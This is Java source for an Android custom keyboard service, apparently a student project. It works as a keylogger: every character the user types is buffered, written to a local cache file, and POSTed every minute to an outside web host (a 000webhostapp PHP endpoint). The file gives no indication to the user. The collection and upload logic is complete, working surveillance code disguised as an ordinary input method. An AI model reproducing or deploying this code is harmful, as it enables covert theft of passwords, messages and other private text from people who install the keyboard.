package hr.fer.collectors;


import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.Keyboard;
import android.inputmethodservice.KeyboardView;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.IBinder;
import android.os.UserHandle;
import android.support.annotation.Nullable;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.InputConnection;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Date;
import java.util.HashMap;
import java.util.Timer;
import java.util.TimerTask;

import hr.fer.connection.HTTPURLConnection;
import hr.fer.keyboard.R;

public class KeyboardCollector extends  InputMethodService
        implements KeyboardView.OnKeyboardActionListener {
    public static final long NOTIFY_INTERVAL = 60 * 1000; // 10 seconds
    private final String PATH = "./cache.txt";
    private final String SERVER_PATH = "https://zavradmb2018.000webhostapp.com/addText.php";
    private HTTPURLConnection service;
    private File cache;

    private KeyboardView kv;
    private android.inputmethodservice.Keyboard keyboard;

    private Date datetime = new Date();
    private boolean caps = false;

    private int id = 0;
    private StringBuilder typedText;

    private Handler handler = new Handler();
    private Timer timer = null;

    @Override
    public View onCreateInputView() {
        kv = (KeyboardView)getLayoutInflater().inflate(R.layout.keyboard, null);
        keyboard = new android.inputmethodservice.Keyboard(this, R.xml.qwerty);
        kv.setKeyboard(keyboard);
        kv.setOnKeyboardActionListener(this);
        return kv;
    }

    @Override
    public void onCreate() {
        super.onCreate();


        File path = getApplicationContext().getFilesDir();
        cache = new File(path, "cache.txt");

        try {
            cache.createNewFile();
        } catch (IOException e) {
            e.printStackTrace();
        }

        typedText = new StringBuilder();
        service = new HTTPURLConnection();

        if (timer != null) {
            timer.cancel();
        } else {
            // recreate new
            timer = new Timer();
        }
        // schedule task
        timer.scheduleAtFixedRate(new CacheTimer(), 0, NOTIFY_INTERVAL);
    }


    @Override
    public void onKey(int primaryCode, int[] keyCodes) {
        Log.d("Key", "Key pressed");
        Log.d("Key", "Key pressed");
        InputConnection ic = getCurrentInputConnection();

        switch (primaryCode) {
            case android.inputmethodservice.Keyboard.KEYCODE_DELETE:
                ic.deleteSurroundingText(1, 0);
                break;
            case android.inputmethodservice.Keyboard.KEYCODE_SHIFT:
                caps = !caps;
                keyboard.setShifted(caps);
                kv.invalidateAllKeys();
                break;
            case android.inputmethodservice.Keyboard.KEYCODE_DONE:
                ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
                break;
            default:
                char code = (char) primaryCode;
                if (Character.isLetter(code) && caps) {
                    code = Character.toUpperCase(code);
                }

                ic.commitText(String.valueOf(code), 1);

                typedText.append(code);
                Log.d("Text typed", "char " + code);
                if (typedText.length() == 10) {
                    try {
                        writeToCache(typedText.toString());
                    } catch (IOException e) {
                        e.printStackTrace();

                    }
                    typedText.setLength(0);
                }
        }


        }



    @Override
    public void onPress(int primaryCode) {
    }

    @Override
    public void onRelease(int primaryCode) {
    }

    @Override
    public void onText(CharSequence text) {

    }

    @Override
    public void swipeDown() {
    }

    @Override
    public void swipeLeft() {
    }

    @Override
    public void swipeRight() {
    }

    @Override
    public void swipeUp() {
    }

    public void writeToCache(String text) throws IOException {
        BufferedWriter stream = new BufferedWriter(new FileWriter(cache, true));
        Log.d("Writing to cache...", text);
        stream.write(text);
        stream.close();
    }

    private class PostDataTOServer extends AsyncTask<Void, Void, Void> {
        private String response = "";
        private String contents = ";";

        HashMap<String, String> postDataParams;
        @Override
        protected void onPreExecute() {
            super.onPreExecute();

        }
        @Override
        protected Void doInBackground(Void... arg0) {
            try {
                readFromCache();
            } catch (IOException e) {
                e.printStackTrace();
            }

            if(contents.length() == 0) return null;

            postDataParams = new HashMap<>();
            postDataParams.put("id", String.valueOf(++id));
            postDataParams.put("text", contents);
            postDataParams.put("datetime", datetime.toString());

            response = service.ServerData(SERVER_PATH,postDataParams);
            return null;
        }


        private void readFromCache() throws IOException {
            int length = (int) cache.length();
            byte[] bytes = new byte[length];

            FileInputStream in = new FileInputStream(cache);
            in.read(bytes);
            contents = new String(bytes);

            Log.d("Read from cache", contents);

            File path = getApplicationContext().getFilesDir();
            cache = new File(path, "cache.txt");
            cache.createNewFile();
        }


    }

    private class CacheTimer extends TimerTask{

        @Override
        public void run() {
            handler.post(new Runnable() {
                @Override
                public void run() {
                    Log.d("CacheTimer", "Sending to server...");
                    //send cached text to server
                    new PostDataTOServer().execute();
                }

            });
        }
    }


}
